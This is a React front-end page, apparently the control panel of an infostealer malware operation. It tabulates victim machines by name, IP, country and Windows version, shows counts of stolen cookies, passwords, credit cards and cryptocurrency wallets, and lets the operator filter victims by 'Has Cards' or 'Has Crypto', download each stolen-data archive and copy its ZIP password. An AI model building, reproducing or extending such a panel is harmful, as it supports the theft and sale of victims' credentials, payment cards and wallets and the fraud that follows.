'use client'

import { api, apiBase } from "@/lib/api"
import { useLogs, Log } from "@/hooks/use-logs"
import { Bitcoin, ChevronDown, ChevronLeft, ChevronRight, Cookie, CreditCard, Key, KeyRound, Monitor, PackageOpen, Search, Trash2, X } from "lucide-react"
import { Fragment, useMemo, useState } from "react"

const PAGE_SIZE = 20

function Flag({ code }: { code: string }) {
    return (
        <img
            src={`https://flagcdn.com/w20/${code.toLowerCase()}.png`}
            alt={code}
            width={20}
            height={18}
            className="inline-block shrink-0"
        />
    )
}

interface Filters {
    search: string
    country: string
    hasCrypto: boolean
    hasCards: boolean
    minCookies: string
    minPasswords: string
}

const DEFAULT_FILTERS: Filters = {
    search: '', country: '', hasCrypto: false, hasCards: false, minCookies: '', minPasswords: '',
}

function applyFilters(logs: Log[], f: Filters): Log[] {
    return logs.filter((log) => {
        if (f.country && log.country !== f.country) return false
        if (f.hasCrypto && log.cryptocurrencies === 0) return false
        if (f.hasCards && log.creditcards === 0) return false
        if (f.minCookies !== '' && log.cookies < Number(f.minCookies)) return false
        if (f.minPasswords !== '' && log.passwords < Number(f.minPasswords)) return false
        if (f.search) {
            const q = f.search.toLowerCase()
            if (!log.name.toLowerCase().includes(q) && !log.ip.includes(q)) return false
        }
        return true
    })
}

//filter components

function Divider() {
    return <span className="w-px h-5 bg-zinc-700/70 shrink-0" />
}

function FilterChip({ active, onClick, icon, label }: {
    active: boolean
    onClick: () => void
    icon: React.ReactNode
    label: string
}) {
    return (
        <button
            onClick={onClick}
            className={`flex items-center gap-1.5 h-8 px-3 rounded-md text-xs font-medium cursor-pointer select-none transition-all ${
                active
                    ? 'bg-violet-500/15 text-violet-300 ring-1 ring-violet-500/40'
                    : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
        >
            <span className={active ? 'text-violet-400' : 'text-zinc-500'}>{icon}</span>
            {label}
        </button>
    )
}

function CountInput({ icon, label, value, onChange }: {
    icon: React.ReactNode
    label: string
    value: string
    onChange: (v: string) => void
}) {
    return (
        <div className="flex items-center h-8 rounded-md overflow-hidden ring-1 ring-zinc-700/60 bg-zinc-900 focus-within:ring-zinc-500 transition-all">
            <span className="flex items-center gap-1.5 pl-2.5 pr-2 border-r border-zinc-700/60 text-xs text-zinc-500 whitespace-nowrap select-none h-full">
                {icon}
                <span>{label}</span>
            </span>
            <input
                type="number"
                min={0}
                className="bg-transparent w-12 px-2 text-sm text-white placeholder-zinc-700 focus:outline-none text-center h-full"
                placeholder="0"
                value={value}
                onChange={(e) => onChange(e.target.value)}
            />
        </div>
    )
}

function FilterBar({ logs, filters, onChange }: {
    logs: Log[]
    filters: Filters
    onChange: (f: Filters) => void
}) {
    const countries = useMemo(
        () => [...new Set(logs.map((l) => l.country))].sort(),
        [logs]
    )

    const set = <K extends keyof Filters>(key: K, value: Filters[K]) =>
        onChange({ ...filters, [key]: value })

    const active = filters.hasCrypto || filters.hasCards || filters.country !== ''
        || filters.minCookies !== '' || filters.minPasswords !== '' || filters.search !== ''

    return (
        <div className="flex items-center gap-2 px-3 py-2 bg-zinc-900/60 border border-zinc-800 rounded-lg flex-wrap">

            {/* search */}
            <div className="relative flex items-center">
                <Search size={13} className="absolute left-2.5 text-zinc-500 pointer-events-none" />
                <input
                    className="h-8 pl-8 pr-3 w-48 rounded-md bg-zinc-800/80 text-sm text-white placeholder-zinc-600 focus:outline-none focus:ring-1 focus:ring-zinc-500 transition-all"
                    placeholder="Name or IP…"
                    value={filters.search}
                    onChange={(e) => set('search', e.target.value)}
                />
            </div>

            {/* country */}
            <div className="relative flex items-center">
                {filters.country && (
                    <span className="absolute left-2.5 pointer-events-none z-10">
                        <Flag code={filters.country} />
                    </span>
                )}
                <select
                    className={`h-8 rounded-md bg-zinc-800/80 text-sm text-white focus:outline-none focus:ring-1 focus:ring-zinc-500 transition-all cursor-pointer appearance-none pr-7 ${filters.country ? 'pl-9' : 'pl-3'}`}
                    value={filters.country}
                    onChange={(e) => set('country', e.target.value)}
                >
                    <option value="">All countries</option>
                    {countries.map((c) => <option key={c} value={c}>{c}</option>)}
                </select>
                <span className="absolute right-2 pointer-events-none text-zinc-500">
                    <svg width="10" height="10" viewBox="0 0 10 10" fill="currentColor"><path d="M1 3l4 4 4-4" stroke="currentColor" strokeWidth="1.5" fill="none" strokeLinecap="round"/></svg>
                </span>
            </div>

            <Divider />

            {/* boolean toggles */}
            <FilterChip
                active={filters.hasCards}
                onClick={() => set('hasCards', !filters.hasCards)}
                icon={<CreditCard size={12} />}
                label="Has Cards"
            />
            <FilterChip
                active={filters.hasCrypto}
                onClick={() => set('hasCrypto', !filters.hasCrypto)}
                icon={<Bitcoin size={12} />}
                label="Has Crypto"
            />

            <Divider />

            {/* count filters */}
            <CountInput
                icon={<Cookie size={12} className="text-amber-400" />}
                label="Cookies ≥"
                value={filters.minCookies}
                onChange={(v) => set('minCookies', v)}
            />
            <CountInput
                icon={<KeyRound size={12} className="text-green-400" />}
                label="Passwords ≥"
                value={filters.minPasswords}
                onChange={(v) => set('minPasswords', v)}
            />

            {/* clear */}
            {active && (
                <>
                    <Divider />
                    <button
                        onClick={() => onChange(DEFAULT_FILTERS)}
                        className="flex items-center gap-1 h-8 px-2 rounded-md text-xs text-zinc-500 hover:text-zinc-200 hover:bg-zinc-800 cursor-pointer transition-all"
                    >
                        <X size={12} />
                        Clear
                    </button>
                </>
            )}
        </div>
    )
}

function DeleteModal({ log, onClose, onDone }: { log: Log; onClose: () => void; onDone: () => void }) {
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError]         = useState<string | null>(null)

    const confirm = async () => {
        setIsLoading(true)
        setError(null)
        try {
            await api(`/logs/delete/${log.id}`, { method: 'DELETE' })
            onDone()
        } catch (err) {
            setError(err instanceof Error ? err.message : 'Failed to delete')
            setIsLoading(false)
        }
    }

    return (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={onClose}>
            <div
                className="bg-zinc-900 border border-zinc-700/50 rounded-lg p-6 w-full max-w-sm shadow-xl"
                onClick={(e) => e.stopPropagation()}
            >
                <div className="flex items-center justify-between mb-4">
                    <h2 className="text-white font-semibold">Delete Log</h2>
                    <X size={16} className="text-zinc-500 hover:text-white cursor-pointer" onClick={onClose} />
                </div>
                <p className="text-zinc-400 text-sm mb-1">
                    Are you sure you want to delete the log for{' '}
                    <span className="text-white font-medium">{log.name}</span>?
                </p>
                <p className="text-zinc-600 text-xs mb-5">This action cannot be undone.</p>
                {error && <p className="text-red-400 text-xs mb-3">{error}</p>}
                <div className="flex gap-2 justify-end">
                    <button
                        onClick={onClose}
                        className="bg-white/5 hover:bg-white/10 text-white px-3 py-1.5 rounded text-sm cursor-pointer transition-colors"
                    >
                        Cancel
                    </button>
                    <button
                        onClick={confirm}
                        disabled={isLoading}
                        className="bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white px-3 py-1.5 rounded text-sm cursor-pointer transition-colors"
                    >
                        {isLoading ? 'Deleting…' : 'Delete'}
                    </button>
                </div>
            </div>
        </div>
    )
}

function Stats({ log }: { log: Log }) {
    return (
        <div className="flex items-center gap-2 tabular-nums text-xs">
            <span className="flex items-center gap-1 bg-amber-400/10 rounded px-2 py-1">
                <Cookie size={13} className="text-amber-400 shrink-0" />
                <span className="text-amber-300">{log.cookies}</span>
            </span>
            <span className="flex items-center gap-1 bg-green-400/10 rounded px-2 py-1">
                <KeyRound size={13} className="text-green-400 shrink-0" />
                <span className="text-green-300">{log.passwords}</span>
            </span>
            <span className="flex items-center gap-1 bg-blue-400/10 rounded px-2 py-1">
                <CreditCard size={13} className="text-blue-400 shrink-0" />
                <span className="text-blue-300">{log.creditcards}</span>
            </span>
            <span className="flex items-center gap-1 bg-orange-400/10 rounded px-2 py-1">
                <Bitcoin size={13} className="text-orange-400 shrink-0" />
                <span className="text-orange-300">{log.cryptocurrencies}</span>
            </span>
        </div>
    )
}

// pagination

function Pagination({ page, total, onChange }: { page: number; total: number; onChange: (p: number) => void }) {
    const pages = Math.ceil(total / PAGE_SIZE)
    if (pages <= 1) return null

    const items: (number | '…')[] = []
    if (pages <= 7) {
        for (let i = 1; i <= pages; i++) items.push(i)
    } else {
        items.push(1)
        if (page > 3) items.push('…')
        for (let i = Math.max(2, page - 1); i <= Math.min(pages - 1, page + 1); i++) items.push(i)
        if (page < pages - 2) items.push('…')
        items.push(pages)
    }

    const btn = "p-1 rounded text-zinc-500 hover:text-white disabled:opacity-30 disabled:cursor-not-allowed cursor-pointer transition-colors"

    return (
        <div className="flex items-center justify-between px-1 text-sm select-none">
            <span className="text-zinc-500 text-xs">
                {(page - 1) * PAGE_SIZE + 1}–{Math.min(page * PAGE_SIZE, total)} of {total}
            </span>
            <div className="flex items-center gap-1">
                <button onClick={() => onChange(page - 1)} disabled={page === 1} className={btn}>
                    <ChevronLeft size={16} />
                </button>
                {items.map((item, i) =>
                    item === '…'
                        ? <span key={`e${i}`} className="px-2 text-zinc-600">…</span>
                        : <button
                            key={item}
                            onClick={() => onChange(item)}
                            className={`w-7 h-7 rounded text-xs font-medium transition-colors cursor-pointer ${item === page ? 'bg-violet-600 text-white' : 'text-zinc-400 hover:text-white hover:bg-zinc-800'}`}
                          >{item}</button>
                )}
                <button onClick={() => onChange(page + 1)} disabled={page === pages} className={btn}>
                    <ChevronRight size={16} />
                </button>
            </div>
        </div>
    )
}


const th = "px-3 py-3 text-left text-xs font-medium uppercase tracking-widest text-zinc-400 whitespace-nowrap"
const td = "px-3 py-2.5 text-sm text-zinc-300 whitespace-nowrap"

export default function Page() {
    const { logs, isLoading, error, refetch } = useLogs()
    const [page, setPage]             = useState(1)
    const [filters, setFilters]       = useState<Filters>(DEFAULT_FILTERS)
    const [deleting, setDeleting]     = useState<Log | null>(null)
    const [expanded, setExpanded]     = useState<Set<string>>(new Set())
    const [copied, setCopied]         = useState<string | null>(null)

    const toggleExpand = (id: string) =>
        setExpanded(prev => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s })

    const copyPass = (log: Log) => {
        if (!log.zipPass) return
        navigator.clipboard.writeText(log.zipPass)
        setCopied(log.id)
        setTimeout(() => setCopied(null), 1500)
    }

    const filtered = useMemo(() => applyFilters(logs, filters), [logs, filters])

    const slice = useMemo(() => {
        const start = (page - 1) * PAGE_SIZE
        return filtered.slice(start, start + PAGE_SIZE)
    }, [filtered, page])

    const handleFilter = (f: Filters) => {
        setFilters(f)
        setPage(1)
    }

    return (
        <div className="flex flex-col h-full gap-3">
            <div className="shrink-0">
                <h1 className="text-white font-semibold text-lg mb-3">Logs</h1>
                {!isLoading && !error && (
                    <FilterBar logs={logs} filters={filters} onChange={handleFilter} />
                )}
            </div>

            {isLoading && <p className="text-zinc-500 text-sm">Loading...</p>}
            {error     && <p className="text-red-400 text-sm">{error}</p>}

            {deleting && (
                <DeleteModal
                    log={deleting}
                    onClose={() => setDeleting(null)}
                    onDone={() => { setDeleting(null); refetch() }}
                />
            )}

            {!isLoading && !error && (
                <div className="border border-zinc-700/50 rounded-lg overflow-hidden flex flex-col flex-1 min-h-0">
                    <div className="overflow-y-auto flex-1">
                        <table className="w-full border-collapse">
                            <thead className="sticky top-0 z-10 bg-zinc-900 shadow-md">
                                <tr>
                                    <th className={th}>Name</th>
                                    <th className={th}>IP</th>
                                    <th className={th}>Country</th>
                                    <th className={th}>Stats</th>
                                    <th className={th}>Date</th>
                                    <th className={th} />
                                </tr>
                            </thead>
                            <tbody>
                                {slice.map((log) => (
                                    <Fragment key={log.id}>
                                    <tr className="border-t border-zinc-700/30 hover:bg-zinc-800/30 transition-colors">
                                        <td className={`${td} text-white font-medium`}>{log.name}</td>
                                        <td className={`${td} font-mono text-xs`}>{log.ip}</td>
                                        <td className={td}>
                                            <span className="flex items-center gap-1.5">
                                                <Flag code={log.country} />{log.country}
                                            </span>
                                        </td>
                                        <td className={td}><Stats log={log} /></td>
                                        <td className={`${td} text-xs text-zinc-500`}>
                                            {new Date(log.createdAt).toLocaleString()}
                                        </td>
                                        <td className={`${td} text-right`}>
                                            <div className="flex items-center justify-end gap-2">
                                                {log.uploadId ? (
                                                    <a
                                                        href={`${apiBase()}/uploads/${log.uploadId}/download`}
                                                        className="text-zinc-500 hover:text-violet-400 cursor-pointer transition-colors"
                                                        title="Download archive"
                                                    >
                                                        <PackageOpen size={14} />
                                                    </a>
                                                ) : (
                                                    <span className="text-zinc-700 cursor-not-allowed" title="No archive">
                                                        <PackageOpen size={14} />
                                                    </span>
                                                )}
                                                <button
                                                    onClick={() => copyPass(log)}
                                                    disabled={!log.zipPass}
                                                    className={`transition-colors cursor-pointer ${log.zipPass ? copied === log.id ? 'text-green-400' : 'text-zinc-500 hover:text-violet-400' : 'text-zinc-700 cursor-not-allowed'}`}
                                                    title={log.zipPass ? (copied === log.id ? 'Copied!' : 'Copy ZIP password') : 'No password stored'}
                                                >
                                                    <Key size={14} />
                                                </button>
                                                <button
                                                    onClick={() => toggleExpand(log.id)}
                                                    className="text-zinc-500 hover:text-zinc-200 cursor-pointer transition-colors"
                                                    title="System info"
                                                >
                                                    <ChevronDown size={14} className={`transition-transform ${expanded.has(log.id) ? 'rotate-180' : ''}`} />
                                                </button>
                                                <button
                                                    onClick={() => setDeleting(log)}
                                                    className="text-zinc-500 hover:text-red-400 cursor-pointer transition-colors"
                                                    title="Delete log"
                                                >
                                                    <Trash2 size={14} />
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                    {expanded.has(log.id) && (
                                        <tr className="border-t border-zinc-800/60 bg-zinc-900/50">
                                            <td colSpan={6} className="px-4 py-2.5">
                                                <div className="flex items-center gap-5 text-xs text-zinc-400">
                                                    <span className="flex items-center gap-1.5">
                                                        <Monitor size={12} className="text-zinc-500 shrink-0" />
                                                        <span>{log.windowsVersion || 'Unknown'}</span>
                                                    </span>
                                                </div>
                                            </td>
                                        </tr>
                                    )}
                                    </Fragment>
                                ))}
                                {slice.length === 0 && (
                                    <tr>
                                        <td colSpan={6} className="px-3 py-10 text-center text-zinc-600 text-sm">
                                            No logs found
                                        </td>
                                    </tr>
                                )}
                            </tbody>
                        </table>
                    </div>

                    <div className="border-t border-zinc-700/30 bg-zinc-900/60 px-3 py-2 shrink-0">
                        <Pagination page={page} total={filtered.length} onChange={setPage} />
                    </div>
                </div>
            )}
        </div>
    )
}
